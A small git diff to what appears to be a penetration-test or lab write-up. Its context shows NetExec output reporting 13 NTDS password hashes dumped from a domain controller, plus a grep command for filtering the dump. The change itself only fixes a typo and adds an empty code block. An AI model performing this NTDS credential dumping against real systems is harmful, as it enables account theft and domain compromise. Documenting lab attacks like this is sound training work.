@@ -389,4 +389,8 @@ SMB         10.1.130.196    445    DC01             [+] Dumped 13 NTDS hashes to
 SMB         10.1.130.196    445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
 SMB         10.1.130.196    445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_10.1.130.196_2026-05-10_193122.ntds | cut -d ':' -f1
 ```
-I can now dump the contents of NTDS via nxc or secretsdump, in this case il
+I can now dump the contents of NTDS via nxc or secretsdump, in this case ill use nxc
+
+```python
+
+```
